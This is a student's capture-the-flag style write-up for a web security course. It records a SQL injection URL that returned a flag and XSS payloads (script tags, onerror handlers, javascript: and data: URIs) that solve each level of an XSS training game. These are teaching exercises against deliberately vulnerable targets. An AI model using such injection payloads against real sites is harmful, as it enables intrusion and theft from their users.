# Writeup 1 - Web I

Name: Simon Berger
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Simon Berger


## Assignment details
This assignment has two parts. It is due by 11/27/19 at 11:59PM.

**There will be late penalty of 5% per day late!**

### Part 1 (40 Pts)

Such a Quick Little, website!

[http://142.93.136.81:5000/](http://142.93.136.81:5000/)

Used `http://142.93.136.81:5000/item?id=1%27%20||%201=1%20--%20` to get `CMSC389R-{y0u_ar3_th3_SQ1_ninj@}`.

### Part 2 (60 Pts)
Complete all 6 levels of:

[https://xss-game.appspot.com](https://xss-game.appspot.com)

1. `<script>alert();</script>`. This was me just trying the basic script XSS attack.
2. `<img onerror="alert('madness');" src="yeet" />` as the post entry. Unforunately, (1) didn't work here. I thought I could use something like `onclick`, but I needed something that would go automatically. I couldn't think of anything -- I'm not particularly well-versed in HTML -- so I had to use a hint, which said to use `img` and `onerror`.
3. `https://xss-game.appspot.com/level3/frame#'onerror='alert()''` as the url. The script, without even looking at it, clearly put the number into the src of an image. So I basically did a sql injection, but in html.
4. `5'); alert('` as the input into the timer seconds count. This was basically the same thought process as (3), with how it places the number into the timer.html, obvious without even looking at the source.
5. `https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()` as the url to the signup page, then enter an email and hit Next. The code on confirm sets a page to go to. So let's set it as javascript to execute, like all those old crappy sites that had links to `javascript:void` or something like that.
6. `https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('ultimate yeet')` as the url. This immediately reminded me of how images can be [transmitted inline with base64](https://en.wikipedia.org/wiki/Data_URI_scheme), as the url. And wikipedia says I can transmit other things instead... like javascript, which was pretty epic.

Produce a writeup. We will not take off points for viewing the source code and/or viewing hints, but we strongly discourage reading online write-ups as that defeats the purpose of the homework.

### Format

Part 1 and 2 can be answered in bullet form or full, grammatical sentences.

### Scoring

* Part 1 is worth 40 points
* Part 2 is worth 60 points

### Tips

Remember to document your thought process for maximum credit!

Review the slides for help with using any of the tools or libraries discussed in
class.
